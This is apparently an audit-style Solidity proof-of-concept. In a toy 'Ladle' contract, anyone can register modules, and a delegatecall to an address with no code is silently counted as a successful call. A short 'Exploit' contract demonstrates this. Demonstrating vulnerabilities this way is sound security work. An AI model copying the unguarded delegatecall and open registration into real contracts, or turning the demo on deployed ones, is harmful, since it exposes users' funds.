// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Ladle {
    mapping(address => bool) public modules;
    uint256 public successfulCalls;
    function addModule(address module, bool set) external { modules[module] = set; }
    function moduleCall(address module, bytes calldata data) external payable returns (bytes memory result) {
        require(modules[module], "unregistered");
        // @> delegatecall to an EOA/non-existent address returns true and empty data.
        (bool success, bytes memory ret) = module.delegatecall(data);
        require(success, "module failed");
        successfulCalls += 1;
        return ret;
    }
}

contract Exploit {
    event Proof(bool success, uint256 calls);
    function run() external {
        Ladle ladle = new Ladle();
        address missing = address(0xBEEF);
        ladle.addModule(missing, true);
        (bool ok,) = address(ladle).call(abi.encodeWithSignature("moduleCall(address,bytes)", missing, bytes("")));
        emit Proof(ok, ladle.successfulCalls());
        require(ok && ladle.successfulCalls() == 1, "nonexistent module was rejected");
    }
}
